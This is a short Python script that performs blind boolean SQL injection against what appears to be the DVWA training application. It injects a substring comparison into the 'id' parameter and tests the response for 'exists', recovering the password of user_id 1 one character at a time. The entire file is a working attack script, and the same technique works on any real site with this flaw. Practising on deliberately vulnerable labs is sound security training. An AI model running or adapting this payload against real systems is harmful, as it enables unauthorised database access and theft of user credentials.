import requests
import sys
import re
from tqdm import tqdm
import time

args = sys.argv
url = args[1]

cookie ={
        "security":"low",
        "PHPSESSID":"lj2skq5tmnd04ddhq3sjprm73e"
        }

for index in tqdm(range(1,32)):
    for char_number in range(48,123):
        char = chr(char_number)
        sql = '1\' and substring((select password from users where user_id =1) ,{index},1)= binary \'{char}\';#'.format(index=index,char=char)

        payload = {
                "id":sql ,
                "Submit" : "Submit"
         }

        response = requests.get(url,params=payload,cookies=cookie)
        if 'exists' in response.text:
            
            print(char,end='')
            break
print("")     
